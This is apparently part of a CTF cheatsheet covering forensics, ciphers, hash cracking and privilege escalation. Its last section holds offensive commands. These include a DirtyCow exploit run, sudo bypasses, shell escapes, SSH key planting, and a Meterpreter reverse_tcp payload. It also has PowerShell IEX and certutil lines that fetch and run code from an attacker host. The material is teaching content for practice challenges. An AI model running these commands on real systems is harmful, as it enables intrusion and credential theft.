**Use `strings` to extract ASCII-readable data:**
```bash
strings <FILE> | grep -i flag
```

**Use `hexeditor` to manually inspect binary layout:**
```bash
hexeditor <FILE>
```

- Look for readable data, base64 patterns, and unexpected headers.
- Look for clues like `flag{...}`, `HTB{...}`, or even **Unicode-encoded** text.

---

#### 🔐 Detect Base64 (Common in CTFs)

If you see patterns like:
```bash
U2FsdGVkX1+VZmxhZ3s0aGFja2VkX2ZsYWd9==
```
The `==` ending suggests **base64 encoding**:
```bash
echo 'U2FsdGVk...' | base64 -d
```

---

### 📡 Runtime Tracing (Dynamic Analysis)

#### 🧩 Monitor Syscalls with `strace`:
```bash
strace -s 9999 -f -e trace=recv,read ./<PROGRAM>
```
- `-f`: Follow child processes.
- `-s`: Increase string capture size (default is 32).
- Watch for runtime flag output or hidden read events.

#### 🧬 Track Function Calls with `ltrace`:
```bash
ltrace ./<PROGRAM>
```
- Reveals **dynamic library calls**, useful for uncovering:
  - Password checks
  - String comparisons
  - File reads

---

### 🎯 Pro Tips for CTFs:

- **Try XOR decoding** if text looks binary but consistent:
```bash
xxd -p file | tr -d '\n' | xxd -r -p | xor_tool
```

- **Use Ghidra or GDB** to trace logic if strings are encrypted or manipulated in memory.

- **Combine `strace` with `tee` or `grep`** to live-watch extracted data.

- **Check for Unicode, ROT13, or hex-encoded flags** if base64 doesn’t reveal useful output.


## Cryptography

---

### 🔐 Caesar Cipher

A **Caesar cipher** is a simple substitution cipher where each letter is shifted by a fixed number in the alphabet.

---

#### 🧭 Classic Caesar Decryption

If the challenge mentions **"caesar"**, it’s likely using a basic shift cipher.

- Try all 25 shifts manually:
```bash
for i in {1..25}; do echo "ciphertext" | tr 'A-Za-z' "$(echo {A..Z} | sed -E "s/(.{$i})(.*)/\2\1/")$(echo {a..z} | sed -E "s/(.{$i})(.*)/\2\1/")"; done
```

Or use [**dCode Caesar Solver**](https://www.dcode.fr/caesar-cipher).

---

#### 🧱 Caesar Box Cipher

If ciphertext contains characters like `!` or appears block-like:
- Likely a **Caesar Box (Columnar Transposition)** cipher.

Use:
👉 [**Caesar Box Solver**](https://www.dcode.fr/caesar-box-cipher)

Paste text and bruteforce dimensions or square sizes.

---

### 🎯 Pro Tips for CTFs:

- **Look for clue words**: "shift", "rotate", "move", "Julius", or "Rome".
- **If numeric hints (like 3 or 13) are given**, use them as shift values.
- **Try reverse shift (ROT13 or ROT-N)** using:
```bash
echo "ciphertext" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

- Combine Caesar decoding with base64 or hex if multiple layers are used.

---

### 🧩 Vigenère Cipher

The **Vigenère cipher** is a polyalphabetic substitution cipher that uses a repeating key to shift letters.

---

#### 🔓 Crack Without Knowing the Key

Use this online bruteforce solver:
👉 [**Guballa Vigenère Solver**](https://www.guballa.de/vigenere-solver)

- Paste the ciphertext and let it auto-detect the key length and content.
- It uses frequency analysis and Kasiski examination behind the scenes.

---

### 🎯 Pro Tips for CTFs:

- **Clues like "key", "password", "repeating", or "polyalphabetic"** often indicate Vigenère.
- Try **common keys** like:
  - `flag`, `ctf`, `security`, `secret`, `pass`
- If a **partial plaintext or known word is visible**, use a **known-plaintext attack**.

- If ciphertext is **all caps with no spaces**, suspect Vigenère or Playfair.

- **Layered encoding** (e.g., base64 → Vigenère → Caesar) is common—decode in reverse.


---

### 🗝️ One-Time Pad (OTP) Cipher

The **One-Time Pad** is an unbreakable cipher when used properly (random key, used once, same length as plaintext). In CTFs, it's often improperly implemented—making it crackable.

---

#### 🔓 Solve OTP Easily

Use this online tool:
👉 [**OTP Decryption Tool**](http://rumkin.com/tools/cipher/otp.php)

- Input the **ciphertext** and **key** (or guess/bruteforce if reused or predictable).
- Decryption is done via XOR of ciphertext and key.

---

### 🧠 CTF Use Case: SSH Private Key Cracking

If OTP is a red herring and you find an `id_rsa` file, use `john` to crack it:

```bash
/usr/share/john/ssh2john.py id_rsa > output.hash
john output.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

> ✅ Often used to escalate after retrieving a user's private key in challenges.

---

### 🎯 Pro Tips for CTFs:

- **OTP ciphertext and key must be same length** — verify before decoding.
- If a reused key is suspected, treat it like a **Vigenère with XOR**.
- **Use hex editors or `xxd`** to identify XOR patterns in binary OTP files.
- Check if the key is:
  - Hardcoded in source
  - Found in another file
  - Same as part of the flag


## Forensics

---

### 🖼️ Image File Analysis

Images often hide flags using steganography, metadata, or embedded file structures.

---

#### 📄 Identify Image File Type

```bash
file <FILE_NAME>
```
- Confirms true file type regardless of extension (e.g., PNG renamed to JPG).

---

#### 🧬 Metadata Analysis

```bash
exiftool <FILE_NAME>
```
- Reveals hidden fields like `Author`, `Comment`, or GPS coordinates.
- Look for unusual tags like `Software`, `UserComment`, or `DocumentName`.

---

#### 🔍 Steganography – Extract Hidden Data

**Use `zsteg` for LSB & color-channel payloads** (PNG only):
```bash
zsteg <FILE_NAME>
```

**Use `steghide` for password-protected embedded content**:
```bash
steghide extract -sf <FILE_NAME>
```
- Prompts for password—use `rockyou.txt` for brute-force attempts.

**Brute-force `steghide` with `steghide_brute`** (optional tool):
```bash
python steghide_brute.py -f <FILE_NAME> -w rockyou.txt
```

---

#### 🔡 Extract Embedded Text

```bash
strings <FILE_NAME> | grep -i flag
```
- Flags often embedded as plaintext or ASCII in CTFs.

---

### 🎯 Pro Tips for CTFs:

- **Check alpha/transparency channels** for hidden overlays.
- **Use `binwalk`** to detect embedded ZIPs, images, or files:
```bash
binwalk -e <FILE_NAME>
```

- **Open image in hex editor** (e.g., `hexeditor`) to inspect tail-end anomalies.
- **Try OCR** (for CAPTCHA-like flags or graphical encodings):
```bash
tesseract <FILE_NAME> stdout
```

- **Check pixel data manipulation using `stegsolve.jar` or `StegSpy`** for deeper analysis.


---

### 🧪 Binwalk – Embedded Data Extraction

`binwalk` is used to analyze binary files (like images or firmware) for **embedded files**, **compressed archives**, or **hidden content**.

---

#### 🔍 Basic Scan
```bash
binwalk <IMAGE_NAME>
```
- Scans for magic bytes indicating ZIPs, PNGs, PDFs, compressed data, etc.

---

#### 🧠 If ZIP/Archive Is Detected

You can extract it manually:
```bash
mv <IMAGE_NAME> <FILE_NAME>.zip
unzip <FILE_NAME>.zip
```

---

#### 🔓 Auto Extract All Embedded Files
```bash
binwalk -e <IMAGE_NAME>
```
- Extracts all identified files into `_<IMAGE_NAME>.extracted/`

---

#### 🔁 Recursive Extraction (Handles nested archives)
```bash
binwalk -Me <IMAGE_NAME>
```
- Ideal for multi-layered CTF stego challenges.

---

### 🎯 Pro Tips for CTFs:

- **Use `--dd` to extract specific types manually**:
```bash
binwalk --dd='.*' <IMAGE_NAME>
```

- **Combine with `steghide`, `exiftool`, and `zsteg`** after extraction.

- **Inspect `footer` of embedded files** — flags may be appended after legitimate content.

- **Good for challenges involving firmware, DOCX/XLSX, or disguised file formats**.


---

### 💽 Extract NTFS Filesystem

NTFS files may contain **hidden data**, **alternate streams**, or **partitioned content**—commonly leveraged in CTFs.

---

#### 🪟 On Windows (Alternate Data Streams)

1️⃣ **List Hidden Streams:**
```cmd
dir /R <FILE_NAME>
```

2️⃣ **Extract Hidden Stream Content:**
```bash
more <FILE_NAME>:<HIDDEN_STREAM>
```
or
```bash
cat <FILE_NAME>:<HIDDEN_STREAM> > output.<ext>
```

3️⃣ Use **7-Zip** to extract `.ntfs` containers directly:
- Right-click → "Extract Here"

---

#### 🐧 On Linux

Mount the NTFS image:
```bash
sudo mount -o loop <FILENAME.ntfs> mnt/
```

- Explore `mnt/` for flags in `$MFT`, `$Recycle.Bin`, or `System Volume Information`.

---

### 🎯 Pro Tips for CTFs:

- **Search for ADS (Alternate Data Streams) manually on Linux:**
```bash
strings <FILE_NAME> | grep -i ":"
```

- **Use `ntfs-3g` for full read/write NTFS access on Linux.**

- **Use `sleuthkit` or `autopsy`** for forensic-level NTFS inspection.

- **Check for base64 or zip files stored in ADS or hidden folders.**


---

### 🧷 Recover Files from Deleted File Systems (Remote Forensics)

Use this method to **image and extract deleted file systems** remotely—commonly required in forensic or IR-based CTFs.

---

#### 📡 Step 1: Create Disk Image Remotely (via SSH)
```bash
ssh username@<REMOTE_IP> "sudo dcfldd if=/dev/sdb | gzip -1 -" > extract.dd.gz
```
- `dcfldd`: Forensic-friendly `dd` with progress and hashing.
- `gzip`: Compress data during transfer.

---

#### 📦 Step 2: Decompress Image Locally
```bash
gunzip extract.dd.gz
```

---

#### 🔍 Step 3: Extract and Analyze
```bash
binwalk -Me extract.dd
```
- Recursively unpacks embedded files, file systems, and archived data.

---

### 🎯 Pro Tips for CTFs:

- **If `dcfldd` not available**, use:
```bash
ssh user@host "sudo dd if=/dev/sdb bs=4M | gzip -" > disk.dd.gz
```

- **Use `photorec` or `foremost`** for file carving:
```bash
photorec /log /d output/ /cmd recover.cmd
```

- **Mount partition for manual inspection**:
```bash
sudo mount -o loop,ro,offset=<OFFSET> extract.dd mnt/
```
- Find offset using `fdisk -l extract.dd`

- **Use `fls` and `icat` from SleuthKit** for targeted recovery:
```bash
fls -r extract.dd
icat extract.dd <inode>
```


---

### 📡 Packet Capture – USB Keystroke Recovery

In CTFs, `.pcap` or `.pcapng` files may contain **USB keyboard traffic**, especially when analyzing hardware-level challenges.

---

#### 🔍 Extract USB Keystrokes from PCAP

Use **tshark** to extract USB data:
```bash
tshark -r <FILE_NAME.pcapng> -Y "usb.transfer_type == 1" \
-e frame.time_epoch -e usb.capdata -T fields
```

- `usb.transfer_type == 1`: Captures **interrupt transfers** (used for keyboard).
- `usb.capdata`: Extracts raw keystroke data.
- Pipe this output into a script to decode keystrokes into readable text.

---

#### 🧠 Full Guide for Decoding USB Input

Follow this detailed article:
👉 [Reverse USB Keystrokes from PCAP (Kaizen CTF)](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)

---

### 🎯 Pro Tips for CTFs:

- **Use Wireshark filters** to explore:
  - `usb.device_address`
  - `usb.transfer_type`
  - `usb.capdata`
  - `frame contains flag`

- **Look for HTTP, FTP, DNS, IRC traffic** in normal `.pcap` files:
```bash
tshark -r capture.pcap -Y "http || ftp || dns" -T fields -e ip.dst -e frame.len
```

- **Use `NetworkMiner` or `tcpflow`** to reconstruct files or extract credentials.

- **Use `strings` on PCAP** for quick wins:
```bash
strings file.pcap | grep -i flag
```

---

### 📜 JavaScript Deobfuscator

Obfuscated JavaScript is often used in web-based CTFs to **hide logic, flags, or backdoor payloads**.

---

#### 🧼 Deobfuscate Quickly

Use this online tool:
👉 [**JSNice**](http://www.jsnice.org/)

- Automatically formats and renames variables using probabilistic models.
- Helps understand logic flow and variable roles in obfuscated scripts.

---

### 🎯 Pro Tips for CTFs:

- **Look for base64, hex, or `eval()` patterns**—common obfuscation tricks.
- **Replace `eval()` with `console.log()`** to inspect decoded payload.
- Use browser DevTools:
  - Paste obfuscated JS into the Console.
  - Step through with breakpoints.
- For heavy obfuscation:
  - Try [**Beautifier.io**](https://beautifier.io/)
  - Use `prettier` or `js-beautify` locally:
    ```bash
    npx prettier --write script.js
    ```

## Password Cracking

---

### 🔑 JOHN the Ripper – Password Cracking

If the challenge references **"JOHN"**, it's likely hinting at using **John the Ripper** to crack hashes or protected archives.

---

#### 🧨 Basic Usage
```bash
john <HASHES_FILE> --wordlist=/usr/share/wordlists/rockyou.txt
```
- Supports formats like `MD5`, `SHA1`, `bcrypt`, `NTLM`, etc.
- Automatically detects hash type in many cases.

---

#### 🔍 Identify Hash Type (if needed)
```bash
john --list=formats | grep <type>
```

Or use [**hash-identifier**] or [**NameThatHash**].

---

#### 🌐 Online Cracking (Known Hashes)

Use:
👉 [**CrackStation**](https://crackstation.net/)

- Paste hash to check against massive precomputed tables.

---

### 🎯 Pro Tips for CTFs:

- **Convert formats using tools:**
  - `zip2john`, `rar2john`, `pdf2john`, `ssh2john`, etc.
  ```bash
  zip2john secret.zip > hash.txt
  john hash.txt --wordlist=rockyou.txt
  ```

- **View cracked passwords:**
```bash
john --show <HASHES_FILE>
```

- **Pause/resume cracking:**
```bash
john --restore
```

- **Crack SSH private key passwords:**
```bash
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=rockyou.txt
```


---

### 🧬 SAM Hashes – Windows User Password Dump

**SAM (Security Account Manager)** stores hashed passwords for Windows accounts. In CTFs, it’s often extracted from mounted `.vhd` or `.img` disk files.

---

#### 🔓 Extract and Dump Hashes

1️⃣ **Copy the SAM and SYSTEM files:**
```bash
cp /mnt/vhd/Windows/System32/config/SAM .
cp /mnt/vhd/Windows/System32/config/SYSTEM .
```

2️⃣ **Organize files:**
```bash
mkdir Backup_dump
mv SAM SYSTEM Backup_dump/
cd Backup_dump/
```

3️⃣ **Dump hashes using `impacket-secretsdump`:**
```bash
impacket-secretsdump -sam SAM -system SYSTEM local
```

✅ You’ll get outputs like:
```
Administrator:500:LMHASH:NTHASH:::
User:1000:LMHASH:NTHASH:::
```

---

### 🎯 Pro Tips for CTFs:

- **Crack NT hashes with `john`:**
```bash
john hashes.txt --format=NT --wordlist=rockyou.txt
```

- **If disk image is encrypted (e.g., BitLocker), unlock first using passphrase or key.**

- Use **`mmls` + `fls` + `icat` (SleuthKit)** for forensic-style SAM/SYSTEM extraction from raw disk images.

- Look for clues in **registry hives** and **user profiles** once hash is cracked.


---

### 🐧 Linux User Hashes – `/etc/passwd` + `/etc/shadow`

In Linux systems, user credentials are stored across two files:

- `/etc/passwd` – stores usernames and UID info
- `/etc/shadow` – stores password hashes (restricted access)

---

#### 🔐 Combine with `unshadow`
```bash
unshadow passwd shadow > merged_hashes.txt
```
- Merges the two files into a format compatible with **John the Ripper**

---

#### 🔓 Crack with John the Ripper
```bash
john merged_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### 🎯 Pro Tips for CTFs:

- **You can extract these from VMs, Docker containers, or mounted file systems.**
- Look for password hashes starting with:
  - `$6$` – SHA-512
  - `$1$` – MD5
  - `$y$` – yescrypt (more secure)
- **Use `john --show`** to reveal cracked results:
```bash
john --show merged_hashes.txt
```

- If you only have one hash:
```bash
echo 'user:$6$hash....' > onehash.txt
john onehash.txt --wordlist=rockyou.txt
```

---

### 🔓 Hashcat – GPU-Accelerated Password Cracking

Hashcat is a powerful tool to crack hashes using GPU acceleration—ideal for large datasets or tougher hashes.

---

#### 🚀 Basic Syntax

```bash
hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `-m 500`: Hash type (500 = MD5 crypt, i.e., `$1$`)
- `-a 0`: Attack mode (0 = dictionary attack)
- `-o`: Output file for cracked results
- `--force`: Ignore warnings (used in VMs or non-GPU systems)

---

### 🔢 Common Hash Modes (Use correct `-m`):

| Hash Type        | Example Prefix | Mode |
|------------------|----------------|------|
| MD5              | —              | 0    |
| SHA1             | —              | 100  |
| SHA256           | —              | 1400 |
| bcrypt           | `$2y$`, `$2b$` | 3200 |
| NTLM             | —              | 1000 |
| SHA512-crypt     | `$6$`          | 1800 |
| MD5-crypt        | `$1$`          | 500  |

> 🔍 Use [hashid](https://github.com/blackploit/hash-identifier) or `hashid <hash>` to detect the hash type.

---

### 🎯 Pro Tips for CTFs:

- Use `--show` to display cracked results:
```bash
hashcat -m 500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

- Crack **hashes from `unshadow`, `zip2john`, or `ssh2john`** by identifying their format and using the right mode.

- Enable optimized GPU use (if supported):
```bash
hashcat -O -w 3 ...
```

- Benchmark all algorithms:
```bash
hashcat -b
```

---

### 📦 7z Password Cracking

To extract and crack a **password-protected `.7z` archive**, use `7z2john.py` from the **John the Ripper** suite.

#### 🔧 Convert to Hash Format:
```bash
7z2john.pl protected.7z > 7z.hash
```

#### 🔓 Crack with John:
```bash
john 7z.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### 🔐 SSH Private Key Cracking

If given an encrypted SSH private key (`id_rsa`), you can recover its password using `ssh2john.py`.

#### 🔧 Convert Key to Hash Format:
```bash
ssh2john.py id_rsa > ssh.hash
```

#### 🔓 Crack with John:
```bash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### 🎯 Pro Tips for CTFs:

- If `john` fails, try `hashcat` with proper hash mode (e.g., `-m 14600` for 7z).
- SSH private key cracks often lead to **user shells or privilege escalation**.
- Always check metadata or filenames (like `backup.7z`, `id_rsa.bak`)—they often contain valuable credentials.


## Privilige Escalation

---

### 🧰 Standard Scripts for Enumeration (CTF Cheatsheet)

Use these tools to automate **privilege escalation**, **system enumeration**, and **data decoding**—critical for post-exploitation in CTFs.

---

#### 🐧 Linux Enumeration

- 🔍 [**LinEnum**](https://github.com/rebootuser/LinEnum)  
  - Automates full Linux system enumeration—users, crons, SUIDs, kernels.

- 🧠 [**LinuxPrivChecker**](https://github.com/sleventyeleven/linuxprivchecker)  
  - Python-based privilege escalation checker (great for local root).

- 🧾 [**Unix-PrivEsc-Check**](https://github.com/pentestmonkey/unix-privesc-check)  
  - Shell script that checks common privilege escalation vectors.

- 📋 [**PEASS-ng (Linux)**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)  
  - `linpeas.sh` – Most comprehensive local enumeration script.

---

#### 🪟 Windows Enumeration

- 🔎 [**JAWS**](https://github.com/411Hall/JAWS)  
  - PowerShell script to scan Windows for escalation paths.

- 📋 [**PEASS-ng (Windows)**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)  
  - `winPEAS.exe` – Deep enumeration of Windows services, tasks, misconfigs.

---

#### 🕵️ Runtime Process/Job Monitoring

- ⏱️ [**pspy**](https://github.com/DominicBreuker/pspy)  
  - Observe **cronjobs**, **timed scripts**, or **root-executed processes** without root.

---

#### ⚙️ Exploit Execution Help

- 🔓 [**GTFOBins**](https://gtfobins.github.io/)  
  - Helps exploit `sudo`, `setuid`, and capability binaries for privilege escalation.

- 📑 [**LOLBAS**](https://lolbas-project.github.io/)  
  - Windows equivalent to GTFOBins—enumerate and abuse trusted binaries.

---

#### 🧬 Data Analysis & Decoding

- 🧪 [**CyberChef**](https://github.com/gchq/CyberChef)  
  - "The Cyber Swiss Army Knife" for base64, hex, XOR, encodings, regex, and more.  
  - Web Version: [CyberChef Online](https://gchq.github.io/CyberChef/)

---

### 🎯 Pro Tips for CTFs:

- Always upload and run **LinEnum or linpeas** immediately after initial shell.
- Combine **pspy + GTFOBins** for powerful cron-based privilege escalation.
- Use **CyberChef** to reverse obfuscation or decode multi-layered strings fast.


---

### 🐮 DirtyCow (Linux Privilege Escalation)

Exploit older Linux kernels with [DirtyCow](https://dirtycow.ninja/):  
👉 PoC Code: [dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)

```bash
gcc -pthread dirty.c -o dirtycow
./dirtycow
su firefart  # Password: dirtycow
```

---

### 🔐 Sudo Exploitation

Check sudo privileges:
```bash
sudo -l
```

Common exploit patterns:

```bash
sudo -u <target_user> /bin/bash
sudo cat /root/root.txt
sudo -u#-1 /bin/bash  # Bypass !root restrictions
```

---

### 🪟 Windows Privilege Escalation

**In Meterpreter:**
```bash
getsystem
background
use post/multi/recon/local_exploit_suggestor
set session 1
run
```

🔍 Other Tools:
- [Sherlock (Privilege Suggestor)](https://github.com/rasta-mouse/Sherlock)
- [FuzzySec PrivEsc Guide](https://www.fuzzysecurity.com/tutorials/16.html)

🧬 Migrate Process:
```bash
migrate <PID>
```

**Shell Delivery:**
```bash
/opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333
msfconsole -r unicorn.rc
```

---

### 🛢️ MySQL & VIM Privilege Escalation

**MySQL Shell:**
```sql
mysql> \! /bin/sh
```

**VIM Shell:**
```bash
sudo /usr/bin/vi /file/path
# Press ESC, then type:
:!/bin/bash
```

---

### ⏱️ Cron Job Exploitation

Monitor system jobs:
```bash
tail -f /var/log/syslog
```

Override input:
```bash
echo 'url = "file:///root/root.txt"' > input
```

---

### 📜 Exploiting More / Less or Journalctl

If executed via a privileged script:
```bash
!/bin/bash
```

Example within VIM/Journalctl:
```bash
sudo /usr/bin/journalctl -n5 -unostromo.service
# Then type !/bin/bash
```

---

### 🧬 Improve Reverse Shell

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
# Press CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

---

### 📂 Transfer Files (Host → Victim)

**Linux:**
```bash
python3 -m http.server
wget http://<HOST_IP>:8000/file.sh
```

**Windows:**
```bash
certutil -urlcache -f http://<HOST_IP>/payload.exe payload.exe
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<HOST_IP>:8000/script.ps1')"
```

---

### 📁 FTP Access

If login successful:
```bash
put id_rsa.pub
rename id_rsa.pub .ssh/authorized_keys
```

---

### 🕵️ Reconnoitre – Enumeration Automation

Multi-threaded recon and service enumeration:
👉 [Reconnoitre Tool](https://github.com/codingo/Reconnoitre)

```bash
reconnoitre -t <TARGET_IP> -o `pwd` --services
```

---
